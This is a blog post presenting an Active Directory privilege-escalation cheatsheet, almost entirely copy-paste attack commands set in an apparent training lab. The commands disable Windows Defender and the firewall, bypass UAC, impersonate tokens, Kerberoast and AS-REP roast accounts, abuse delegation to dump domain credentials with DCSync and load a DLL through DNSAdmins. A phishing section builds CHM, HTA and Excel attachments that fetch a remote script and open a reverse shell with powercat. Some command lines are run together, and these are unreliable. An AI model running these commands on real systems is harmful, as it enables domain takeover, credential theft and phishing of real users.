---
title: Domain Privilege Escalation cheatsheet
subtitle: Once an adversary has gained an initial foothold in the network, they will seek to escalate their privileges and compromise additional systems to locate sensitive data and other critical resources.

# Summary for listings and search engines
summary: Once an adversary has gained an initial foothold in the network, they will seek to escalate their privileges and compromise additional systems to locate sensitive data and other critical resources.

# Link this post with a project
projects: []

# Date published
date: '2022-07-31T00:00:00Z'

# Date updated
lastmod: '2022-07-31T00:00:00Z'

# Is this an unpublished draft?
draft: false

# Show this page in the Featured widget?
featured: false

# Featured image
# Place an image named `featured.jpg/png` in this page's folder and customize its options here.
image:
  caption: 'Image credit: [**Giovanni Pecoraro**](https://unsplash.com/photos/CpkOjOcXdUY)'
  focal_point: ''
  placement: 2
  preview_only: false

authors:
  - admin

tags:
  - Cheatsheet
  - Red Teaming
  - Windows
  - Active Directory
  - Privilege Escalation

categories:
  - Cyber Security
  - Red Teaming

---

## Windows Defender

```powershell
# Disable Windows Defender
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true

# Disable Firewall
## cmd.exe
netsh advfirewall set allprofiles state off

## powershell.exe
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```

##  User Account Control (UAC)

In case you are a member of the local administrators group, but you still have the *Medium Mandatory Level* label, it is necessary to bypass the *User Account Control (UAC)*:

```powershell
# FodhelperUACBypass.ps1
. .\FodhelperUACBypass.ps1
FodhelperUACBypass -program "cmd.exe"
FodhelperUACBypass -program "cmd.exe /c powershell.exe"
FodhelperUACBypass -program "cmd.exe /c net localgroup administrators CYBERLAB\STUDENT01 /add"
```

Alternatively, you can use [SharpBypassUAC](https://github.com/FatRodzianko/SharpBypassUAC).

## Token Manipulation

Tokens can be impersonated from other users with a session/running processes on the machine. A similar effect can be achieved by using e.g. CobaltStrike to inject into said processes.

### Incognito

```powershell
# A SYSTEM shell is required
.\PsExec64.exe -s -i -d powershell.exe

# Show tokens on the machine
.\incognito.exe list_tokens -u

# Start new process with token of a specific user
.\incognito.exe execute "CYBERLAB\STUDENT2" C:\Windows\system32\calc.exe
.\incognito.exe execute -c "CYBERLAB\STUDENT2" powershell.exe
```

### Invoke-TokenManipulation

```powershell
# Show all tokens on the machine
Invoke-TokenManipulation -ShowAll

# Show only unique, usable tokens on the machine
Invoke-TokenManipulation -Enumerate

# Start new process with token of a specific user
Invoke-TokenManipulation -ImpersonateUser -Username "CYBERLAB\STUDENT2"

# Start new process with token of another process
Invoke-TokenManipulation -CreateProcess "C:\Windows\system32\calc.exe" -ProcessId 500
```

## Classic Kerberoasting

1. Find user accounts used as Service accounts:
    
    ```powershell
    # PowerView
    Get-NetUser -SPN
    
    # ActiveDirectory Module
    Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
    ```
    
2. Request a Ticket Granting Service (TGS):
    
    ```powershell
    # PowerShell
    Add-Type -AssemblyName System.IdentityModel
    New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/database.cyberlab.cybercorp.local"
    
    # PowerView
    Request-SPNTicket -SPN "MSSQLSvc/database.cyberlab.cybercorp.local"
    ```
    
3. Check if the TGS has been granted:
    
    ```powershell
    klist
    ```
    
4. Export all tickets using Mimikatz
    
    ```powershell
    # Invoke-Mimikatz
    Invoke-Mimikatz -Command '"kerberos::list /export"'
    ```
    
5. Crack the Service account password (this step can be performed on a Kali machine):
    
    ```powershell
    # tgsrepcrack.py
    git clone https://github.com/nidem/kerberoast
    python3 ./tgsrepcrack.py ./10-million-password-list-top-1000000.txt ./240a10000-STUDENT1@MSSQLSvc~database.cyberlab.cybercorp.localCYBERLAB.LOCAL.kirbi
    ```
    
    the same TGS can also be cracked by using `john`, but it must be firstly converted into a compatible format:
    
    ```bash
    # tgsrepcrack.py
    python3 ./kirbi2john.py -o ./tgs.john ./240a10000-STUDENT1@MSSQLSvc~database.cyberlab.cybercorp.localCYBERLAB.LOCAL.kirbi
    
    # JohnTheRipper
    /usr/sbin/john --format=krb5tgs ./tgs.john --wordlist=./10-million-password-list-top-1000000.txt
    ```
    

An alternative way to perform Kerberoasting is to use `PowerSploit` combined to `john` or `hashcat`:

1. Find user accounts used as Service accounts:
    
    ```powershell
    # PowerView
    Get-NetUser -SPN
    
    # ActiveDirectory Module
    Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
    ```
    
2. Request a TGS:
    
    ```powershell
    # Invoke-Kerberoast.ps1
    ## JohnTheRipper (bleeding-jumbo branch)
    Invoke-Kerberoast -OutputFormat john | % { $_.Hash } | Out-File -Encoding ASCII john_tgs.kirbi
    
    ## HashCat
    Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashcat_tgs.kirbi
    ```
    
3. Brute-force the exported ticket:
    
    ```bash
    # JohnTheRipper (bleeding-jumbo branch)
    john --format=krb5tgs --wordlist=./10-million-password-list-top-1000000.txt john_tgs.kirbi
    
    # HashCat
    hashcat -m 13100 --force hashcat_tgs.kirbi ./10-million-password-list-top-1000000.txt
    ```
    
    The `hashcat` format can also be cracked by `john`.
    

## Targeted Kerberoasting (Set SPN)

With enough rights (*GenericAll*/*GenericWrite*), a target user’s SPN can be set to anything (unique in the domain). We can then request a TGS without special privileges. The TGS can then be “Kerberoasted”.

1. Let’s enumerate the permissions for RDPUsers on ACLs
    
    ```
    # PowerView
    Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "RDPUsers"}
    ```
    
2. Check if the user already has a SPN:
    
    ```powershell
    # PowerView_dev
    Get-DomainUser -Identity "STUDENT2" | select ServicePrincipalName
    
    # ActiveDirectory Module
    Get-ADUser -Identity "STUDENT2" -Properties ServicePrincipalName | select ServicePrincipalName
    ```
    
3. Set a SPN for the user (must be unique for the domain):
    
    ```powershell
    # PowerView
    Set-DomainObject -Identity "STUDENT2" -Set @{serviceprincipalname='ops/whatever1'}
    
    # ActiveDirectory Module
    Set-ADUser -Identity "STUDENT2" -ServicePrincipalNames @{Add='ops/whatever1'}
    ```
    
4. Request a TGS:
    
    ```powershell
    # PowerShell
    Add-Type -AssemblyNAme System.IdentityModel
    New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ops/whatever1"
    
    # PowerView
    Request-SPNTicket -SPN "ops/whatever1"
    ```
    
5. Check if the ticket has been granted:
    
    ```powershell
    klist
    ```
    
6. Export all tickets using Mimikatz:
    
    ```powershell
    # Invoke-Mimikatz
    Invoke-Mimikatz -Command '"kerberos::list /export"'
    ```
    
7. Crack the Service account password (this step can be performed on a Kali machine):
    
    ```bash
    # tgsrepcrack.py
    git clone https://github.com/nidem/kerberoast
    python3 ./tgsrepcrack.py ./10-million-password-list-top-1000000.txt ./240a10000-student1@ops~whatever1CYBERLAB.CYBERCORP.LOCAL.kirbi
    ```
    
    the same TGS can also be cracked by using `john`, but it must be firstly converted into a compatible format:
    
    ```bash
    # tgsrepcrack.py
    python3 ./kirbi2john.py -o ./tgs.john ./240a10000-STUDENT1@MSSQLSvc~database.cyberlab.cybercorp.localCYBERLAB.LOCAL.kirbi
    
    # JohnTheRipper
    /usr/sbin/john --format=krb5tgs ./tgs.john --wordlist=./10-million-password-list-top-1000000.txt
    ```
    

## ASREProasting (AS-REP)

If a user’s *UserAccountControl* settings have *Do not require Kerberos preauthentication* enabled, i.e. Kerberos preauth is disabled, it is possible to grab user’s crackable AS-REP and brute-force it offline. With sufficient rights (*GenericWrite* or *GenericAll*), Kerberos preauth can be forced disabled as well.

1. Enumerating accounts with Kerberos Preauth disabled:
    
    ```powershell
    # PowerView_dev
    Get-DomainUser -PreauthNotRequired -Verbose
    
    # ActiveDirectory Module
    Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
    ```
    
    or let’s enumerate the permissions for *RDPUsers* on ACLs:
    
    ```powershell
    # PowerView
    Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "RDPUsers"}
    ```
    
    Users in *RDPUser* group have *GenericWrite* or *GenericAll* permission on *STUDENTI1* user so it is possible to force the disable of Kerberos Preauth on it:
    
    ```powershell
    # PowerView_dev
    Set-DomainObject -Identity "STUDENTI1" -XOR @{useraccountcontrol=4194304} -VerboseGet-DomainUser -PreauthNotRequired -Verbose
    ```
    
2. Request encrypted AS-REP for offline brute-force
    
    ```powershell
    # ASREPRoast
    # JohnTheRipper (bleeding-jumbo branch)
    Get-ASREPHash -UserName "STUDENTI1" -Verbose | Out-File -Encoding ASCII john_asrep.kirbi
    
    # HashCat
    Get-ASREPHash -UserName "STUDENTI1" -Verbose | % {$_.replace('$krb5asrep$','$krb5asrep$23$')} | Out-File -Encoding ASCII hashcat_asrep.kirbi
    ```
    
    It is also possible to enumerate all users with Kerberos preauth disabled and request a hash:
    
    ```powershell
    # ASREPRoast
    # JohnTheRipper (bleeding-jumbo branch)
    Invoke-ASREPRoast -Verbose | % { $_.Hash } | Out-File -Encoding ASCII john_asrep.kirbi
    
    # HashCat
    Invoke-ASREPRoast -Verbose | % { $_.Hash } | % {$_.replace('$krb5asrep$','$krb5asrep$23$')} | Out-File -Encoding ASCII hashcat_asrep.kirbi
    ```
    
3. Using bleeding-jumbo branch of John The Ripper or HashCat, we can brute-force the hashes offline:
    
    ```bash
    # JohnTheRipper (bleeding-jumbo branch)
    /usr/sbin/john --format=krb5asrep --wordlist=./10-million-password-list-top-1000000.txt john_asrep.kirbi
    
    # HashCat
    hashcat -m 18200 --force hashcat_asrep.kirbi ./10-million-password-list-top-1000000.txt
    ```
    

## Unconstrained Delegation

General/Basic or Unconstrained Delegation which allows the first hop server (e.g. web server) to request access to any service on any computer in the domain.

1. Discover domain computers which have unconstrained delegation enabled:
    
    ```powershell
    # PowerView
    Get-NetComputer -UnConstrained
    
    # ActiveDirectory Module
    Get-ADComputer -Filter {TrustedForDelegation -eq $True}Get-ADUser -Filter {TrustedForDelegation -eq $True}
    ```
    
2. Compromise the server(s) where Unconstrained delegation is enabled and trick or wait for a domain admin to connect to the service. We can use the following PowerView command to notify for a particular DA to access a resource on the web server:
    
    ```powershell
    # PowerView
    Invoke-UserHunter -ComputerName "ops-web" -Poll 100 -UserName "Administrator" -Delay 5 -Verbose
    ```
    
3. Run following commands on it to check if any DA ticket is available and then export it:
    
    ```powershell
    # Invoke-Mimikatz
    Invoke-Mimikatz -Command '"sekurlsa::tickets"'Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
    ```
    
4. The DA ticket could then be reused:
    
    ```powershell
    # Invoke-Mimikatz
    Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\user1\[0;2ceb8b3]-2-060a10000-Administrator@krbtgtCYBERLAB.CYBERCORP.LOCAL.kirbi"'
    ```
    

## Constrained Delegation

Constrained Delegation allows the first hop server (e.g web server) to request access only to specified services on specified computers. If the user is not using Kerberos authentication to authenticate to the first hop server, Windows offers *Protocol Transition* to transition the request to Kerberos.

To impersonate the user, **Service for User** (**S4U**) extension is used and it provides two extensions:

- **Service for User to Self** (**S4U2self**): Allows a service to obtain a forwardable TGS to itself on behalf of a user with just the user principal name without supplying a password. The service account must have the *TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION* - T2A4D UserAccountControl attribute.
- **Service for User to Proxy** (**S4U2proxy**): Allows a service to obtain a TGS to a second service on behalf of a user. Which second service? This is controlled by *msDS-AllowedToDelegateTo* attribute. This attribute contains a list of SPNs to which the user tokens can be forwarded.

If you have compromised a user account or a computer (machine account) that has kerberos constrained delegation enabled, it’s possible to impersonate any domain user (including administrator) and authenticate to a service that the user account is trusted to delegate to.

Enumerate users and computers with constrained delegation enabled:

```powershell
# PowerView_dev
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# ActiveDirectory Module
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```

## Constrained delegation allowed for a User Account

1. To abuse constrained delegation in above scenario, we need to have access to the account for which the constrained delegation is enabled. If we have access to that account, it is possible to access the services listed in msDS-AllowedToDelegateTo of this account as ANY user.
2. Using *asktgt* from Kekeo, we request a TGT as the abused account. Either plaintext password or NTLM hash of the compromised account (with constrained delegation enabled) is required:
    
    ```
    # Kekeo
    kekeo# tgt::ask /user:WEBSVC /domain:cyberlab.cybercorp.local /rc4:[NTLM_HASH_USER_ENABLED_DELEGATION]
    ```
    
3. Using s4u from Kekeo, we request a TGS as ANY user for the service to which the delegation is enabled, e.g. *FILESERVER*, using the TGT previously obtained:
    
    ```
    # Kekeo
    kekeo# tgs::s4u /tgt:[TGT_USER_ENABLED_DELEGATION] /user:Administrator@CYBERLAB.CYBERCORP.LOCAL /service:cifs/FILESERVER.CYBERLAB.CYBERCORP.LOCAL
    ```
    
4. Using mimikatz, inject the TGS ticket:
    
    ```powershell
    # Invoke-Mimikatz
    Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@cyberlab.cybercorp.local@CYBERLAB.CYBERCORP.LOCAL_cifs~FILESERVER.CYBERLAB.CYBERCORP.LOCAL@CYBERLAB.CYBERCORP.LOCAL.kirbi"'
    ```
    
5. Access the file shares of the target:
    
    ```powershell
    ls \\fileserver.cyberlab.cybercorp.local\c$
    ```
    
    Another interesting issue in Kerberos is that the delegation occurs not only for the specified service but for any service running under the same account. There is no validation for the SPN specified.
    

## Constrained delegation allowed for a Machine Account

If you have compromised a machine account or in other words you have SYSTEM level privileges on a machine that is configured with constrained delegation, you can assume any identity in the AD domain and authenticate to services that the compromised machine is trusted to delegate to.

1. List services to which the machine account is trusted to delegate to:
    
    ```powershell
    # PowerView
    Get-NetComputer "COMPUTER1" | select name, msds-allowedtodelegateto, useraccountcontrol | fl
    Get-NetComputer "COMPUTER1" | Select-Object -ExpandProperty msds-allowedtodelegateto | fl
    ```
    
2. Using asktgt from Kekeo, we request a TGT as the abused account (in this case a machine account):
    
    ```
    # Kekeo
    kekeo# tgt::ask /user:cyberlab-adminsrv$ /domain:CYBERLAB.CYBERCORP.LOCAL /rc4:1fadb1b13edbc5a61cbdc389e6f34c67
    ```
    
3. Using s4u from Kekeo (no SNAME validation) it is possible to ask for a TGS also for *time* and *ldap* services by running other two separate commands (putting both the base service and a single alternative one):
    
    ```
    # Kekeo
    kekeo# tgs::s4u /tgt:TGT_cyberlabadminsrv$@CYBERLAB.CYBERCORP.LOCAL_krbtgt~cyberlab.cybercorp.local@CYBERLAB.CYBERCORP.LOCAL.kirbi /user:Administrator@cyberlab.cybercorp.local /service:cifs/fileserver.cyberlab.cybercorp.local
    kekeo# tgs::s4u /tgt:TGT_cyberlabadminsrv$@CYBERLAB.CYBERCORP.LOCAL_krbtgt~cyberlab.cybercorp.local@CYBERLAB.CYBERCORP.LOCAL.kirbi /user:Administrator@cyberlab.cybercorp..local /service:cifs/fileserver.cyberlab.cybercorp.local|time/fileserver.cyberlab.cybercorp.local
    kekeo# tgs::s4u /tgt:TGT_cyberlabadminsrv$@CYBERLAB.CYBERCORP.LOCAL_krbtgt~cyberlab.cybercorp.local@CYBERLAB.CYBERCORP.LOCAL.kirbi /user:Administrator@cyberlab.cybercorp.local /service:cifs/fileserver.cyberlab.cybercorp.local|ldap/fileserver.cyberlab.cybercorp.local
    ```
    
4. Using mimikatz it is possible to inject all the generated TGS tickets (from the previous commands) into the session:
    
    ```powershell
    # Invoke-Mimikatz
    Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@cyberlab.cybercorp.local@CYBERLAB.CYBERCORP.LOCAL_cifs~cyberlab-dc.cyberlab.cybercorp.local@CYBERLAB.CYBERCORP.LOCAL.kirbi"'
    Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@cyberlab.cybercorp.local@CYBERLAB.CYBERCORP.LOCAL_time~cyberlab-dc.cyberlab.cybercorp.local@CYBERLAB.CYBERCORP.LOCAL_ALT.kirbi"'
    Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@cyberlab.cybercorp.local@CYBERLAB.CYBERCORP.LOCAL_ldap~cyberlab-dc.cyberlab.cybercorp.local@CYBERLAB.CYBERCORP.LOCAL_ALT.kirbi"'
    ```
    
5. If we have a ticket for the LDAP service it is possible to perform a DCSync:
    
    ```powershell
    # Invoke-Mimikatz
    Invoke-Mimikatz -Command '"lsadump::dcsync /user:cyberlab\krbtgt"'Invoke-Mimikatz -Command '"lsadump::dcsync /user:cyberlab\administrator"'
    ```
    

The same procedure can also be performed by using `Rubeus`:

1. Using asktgt from Rubeus, we request a TGT as the abused account (in this case a machine account):
    
    ```powershell
    # Rubeus
    .\Rubeus.exe asktgt /user:cyberlab-adminsrv$ /domain:CYBERLAB.CYBERCORP.LOCAL /rc4:1fadb1b13edbc5a61cbdc389e6f34c67 /outfile:deleg.kirbi
    ```
    
2. Using s4u from Rubeus (no SNAME validation) it is possible to ask for a TGS also for *time* and *ldap* services (remember to include in the *altservice* field also the first service):
    
    ```powershell
    # Rubeus
    .\Rubeus.exe s4u /ticket:deleg.kirbi /impersonateuser:administrator /msdsspn:cifs/cyberlab-dc.cyberlab.cybercorp.local /altservice:cifs,time,ldap,http,wsman,host,rpcss /ptt
    ```
    

An alternative in case of SYSTEM level compromise of a machine with constrained delegation enabled:

1. Impersonate the Administrator account:
    
    ```powershell
    [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel') | out-null
    $idToImpersonate = New-Object System.Security.Principal.WindowsIdentity @('administrator')
    $idToImpersonate.Impersonate()[System.Security.Principal.WindowsIdentity]::GetCurrent() | select name
    ```
    
2. Try to access the service (in case the COMPUTER1 is allowed to delegate to DC CIFS service):
    
    ```powershell
    ls \\cyberlab-dc.cyberlab.cybercorp.local\c$
    ```

## DNSAdmin

It is possible for the members of the DNSAdmins group to load arbitrary DLL with the privileges of *dns.exe* (SYSTEM). In case the DC also serves as DNS, this will provide us escalation to DA. Privileges to restart the DNS service are needed.

1. Enumerate the members of the DNSAdmis group
    
    ```powershell
    # PowerView
    Get-NetGroupMember -GroupName "DNSAdmins"
    
    # ActiveDirectory Module
    Get-ADGroupMember -Identity "DNSAdmins"
    ```
    
    Once we know the members of the DNSAdmins group, we need to compromise a member.
    
2. Install DNS RSAT tools (if not present):
    
    ```powershell
    Get-WindowsCapability -Name RSAT* -Online | Add-WindowsCapability –Online
    ```
    
3. From the privileges of DNSAdmins group member, configure DLL using dnscmd.exe (needs RSAT DNS):
    
    ```powershell
    # RSAT DNS
    dnscmd cyberlab-dc /config /serverlevelplugindll \\FILESERVER_IP\dll\mimilib.dll # Absolute path
    ```
    
    or using DNSServer module (needs RSAT DNS):
    
    ```powershell
    # RSAT DNS
    $dnsettings = Get-DnsServerSetting -ComputerName cyberlab-dc -Verbose -All
    $dnsettings.ServerLevelPluginDll = "\\FILESERVER_IP\dll\mimilib.dll"  # Absolute path
    Set-DnsServerSetting -InputObject $dnsettings -ComputerName cyberlab-dc -Verbose
    ```
    
4. From a CMD shell restart the DNS service (assuming that the DNSAdmins group has the permission to do so):
    
    ```powershell
    sc \\cyberlab-dc stop dns
    sc \\cyberlab-dc start dns
    ```
    
    By default, the mimilib.dll logs all DNS queries to **C:\Windows\System32\kiwidns.log**
    
    If you want to implement a custom DLL to perform custom actions (i.e. add a user to the Administrators group), it is possible to use the template present at this link [DNSAdmin-DLL](https://github.com/kazkansouh/DNSAdmin-DLL). In fact, the DLL must export predefined functions to be accepted by the DNS service.
    

## Phishing

In order to perform a phishing attack it is necessary to perform the following steps:

1. Find the mail server by looking at SMTP open ports (25, 587, 465):
    
    ```powershell
    (25, 587, 465) | % {powercat -c smtp.cyberlab.local -p $_ -t 1 -Verbose -d}
    ```
    
2. Generate a malicious attachment to be sent within the mail message:
    
    ```powershell
    # Nishang
    Out-CHM -PayloadScript .\Invoke-PowerShellTcp.ps1 -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
    Out-CHM -PayloadURL http://192.168.50.53/powercat_connect.ps1 -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
    Out-CHM -Payload "-c net localgroup administrators CYBERLAB\STUDENT01 /add" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
    
    Out-Excel -PayloadURL http://192.168.50.53/powercat_connect.ps1 -DDE
    
    Out-HTA -PayloadURL http://192.168.50.53/powercat_connect.ps1
    Out-HTA -Payload "powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c . \\10.10.10.10\tmp\powercat.ps1; powercat -c ws01 -p 443 -e cmd"
    Out-HTA -Payload "powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c net localgroup administrators cyberlab\student01 /add"
    ```
    
3. Connect to the SMTP server and the send the message to the recipients:
    
    ```powershell
    # phishing.ps1
    $recipients = @("lbunce@cyberlab.local","bschonfelder@cyberlab.local")
    $sender = "giovanni@pecoraro.local"
    $subject = "Important mail"
    $body = "Please open the attachment"
    $smtp_server = "smtp.cyberlab.local"
    $smtp_port = 25$attachment_path = ".\doc.chm"
    
    Foreach ($rcpt in $recipients) {    
    	Write-Host -ForegroundColor Yellow "Sending phishing email to $rcpt"    
    	Send-MailMessage -To $rcpt -From $sender -Subject $subject -Body $body -SmtpServer $smtp_server -Port $smtp_port -Attachments $attachment_path
    }
    ```
    

## Brute-forcing

```powershell
# hydra.exe
.\hydra.exe -L ..\usernames.txt -P ..\500-worst-passwords.txt "http-post-form://192.168.2.50:8080/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2FasynchPeople%2F&Submit=Sign+in:Invalid"
```
---